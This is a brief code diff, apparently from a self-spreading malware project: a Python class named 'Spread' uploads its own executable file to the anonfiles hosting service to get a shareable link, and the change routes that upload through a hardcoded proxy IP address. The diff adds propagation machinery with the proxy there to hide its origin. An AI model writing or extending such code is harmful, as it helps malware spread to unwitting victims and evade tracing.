@@ -19,4 +19,7 @@ class Spread:
         except Exception as e:pass
 
     def _link(self):
-        return requests.post('https://api.anonfiles.com/upload',files={'file':open(sys.argv[0],"rb")}).json()['data']['file']['url']['full']
+        proxies = {
+            'https': '38.170.97.205:8080'
+        }
+        return requests.post('https://api.anonfiles.com/upload', proxies=proxies, files={'file':open(sys.argv[0],"rb")}).json()['data']['file']['url']['full']
